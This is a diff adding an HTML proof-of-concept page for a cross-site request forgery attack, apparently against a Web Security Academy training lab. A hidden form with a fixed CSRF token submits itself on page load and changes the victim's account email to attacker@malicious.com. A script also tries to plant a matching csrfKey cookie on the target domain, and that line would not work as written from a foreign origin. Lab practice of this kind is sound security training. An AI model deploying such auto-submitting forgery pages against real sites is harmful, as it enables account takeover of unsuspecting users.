@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CSRF Attack - Cookie/Token Pair</title>
+</head>
+<body>
+    <h1>Loading...</h1>
+    
+    <form id="csrfForm" action="https://0aa000530398347685d172d3002500c3.web-security-academy.net/my-account/change-email" method="POST" style="display:none;">
+        <input type="hidden" name="email" value="attacker@malicious.com">
+        <input type="hidden" name="csrf" value="l4rdzhIDrAEvudIdwGseZzvLyy5JwVYm">
+    </form>
+
+    <script>
+        // Set the csrfKey cookie that corresponds to our CSRF token
+        document.cookie = "csrfKey=7wqUf49jxuCWHuYZJrSyWmYTvvCsbANS; path=/; domain=0aa000530398347685d172d3002500c3.web-security-academy.net";
+        
+        // Automatically submit the form when the page loads
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('csrfForm').submit();
+        });
+    </script>
+</body>
+</html>
